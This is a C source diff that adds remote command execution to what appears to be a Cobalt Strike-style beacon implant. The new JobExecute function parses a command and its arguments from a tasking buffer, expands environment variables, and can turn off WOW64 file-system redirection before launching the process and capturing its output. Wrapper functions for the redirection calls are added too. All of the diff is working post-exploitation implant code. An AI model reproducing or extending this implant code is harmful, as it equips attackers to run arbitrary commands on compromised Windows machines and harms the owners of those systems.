@@ -6,6 +6,7 @@
 #include "identity.h"
 #include "pipe.h"
 #include "spawn.h"
+#include "utils.h"
 
 
 typedef struct _JOB_ENTRY
@@ -283,4 +284,61 @@ void JobExecuteInternal(char* buffer, int length)
 		JOB_ENTRY* job = JobRegisterProcess(&lPi, hRead, hWrite, "process");
 		job->callbackType = CALLBACK_OUTPUT_OEM;
 	}
+}
+
+typedef BOOL(WINAPI* WOW64DISABLEWOW64FSREDIRECTION)(PVOID* OldValue);
+typedef BOOL(WINAPI* WOW64REVERTWOW64FSREDIRECTION)(PVOID OldValue);
+
+BOOL kernel32$Wow64DisableWow64FsRedirection(PVOID* OldValue)
+{
+	HMODULE hModule = GetModuleHandleA("kernel32");
+	WOW64DISABLEWOW64FSREDIRECTION fnWow64DisableWow64FsRedirection = (WOW64DISABLEWOW64FSREDIRECTION)GetProcAddress(hModule, "Wow64DisableWow64FsRedirection");
+	if (!fnWow64DisableWow64FsRedirection)
+		return FALSE;
+
+	return fnWow64DisableWow64FsRedirection(OldValue);
+}
+
+BOOL kernel32$Wow64RevertWow64FsRedirection(PVOID OldValue)
+{
+	HMODULE hModule = GetModuleHandleA("kernel32");
+	WOW64REVERTWOW64FSREDIRECTION fnWow64RevertWow64FsRedirection = (WOW64REVERTWOW64FSREDIRECTION)GetProcAddress(hModule, "Wow64RevertWow64FsRedirection");
+	if (!fnWow64RevertWow64FsRedirection)
+		return FALSE;
+
+	return fnWow64RevertWow64FsRedirection(OldValue);
+}
+
+void JobExecute(char* buffer, int length)
+{
+#define MAX_RUNNABLE_CMD 0x2000
+#define MAX_EXPANDED_CMD 0x2000
+#define MAX_ARGS 0x2000
+#define MAX_CMD 0x2000
+
+	datap* locals = BeaconDataAlloc(MAX_RUNNABLE_CMD + MAX_EXPANDED_CMD + MAX_ARGS + MAX_CMD);
+	char* runnableCmd = BeaconDataPtr(locals, MAX_RUNNABLE_CMD);
+	char* expandedCmd = BeaconDataPtr(locals, MAX_EXPANDED_CMD);
+	char* args = BeaconDataPtr(locals, MAX_ARGS);
+	char* cmd = BeaconDataPtr(locals, MAX_CMD);
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	BeaconDataStringCopySafe(&parser, runnableCmd, MAX_RUNNABLE_CMD);
+	BeaconDataStringCopySafe(&parser, args, MAX_ARGS);
+	BOOL disableWow64FsRedirection = BeaconDataShort(&parser);
+	ExpandEnvironmentStrings_s(runnableCmd, expandedCmd, MAX_EXPANDED_CMD);
+	strncat_s(cmd, MAX_CMD, expandedCmd, MAX_EXPANDED_CMD);
+	strncat_s(cmd, MAX_CMD, args, MAX_ARGS);
+
+	PVOID oldValue;
+	if(disableWow64FsRedirection)
+		kernel32$Wow64DisableWow64FsRedirection(&oldValue);
+
+	JobExecuteInternal(cmd, strlen(cmd) + 1);
+
+	if(disableWow64FsRedirection)
+		kernel32$Wow64RevertWow64FsRedirection(oldValue);
+
+	BeaconDataFree(locals);
 }
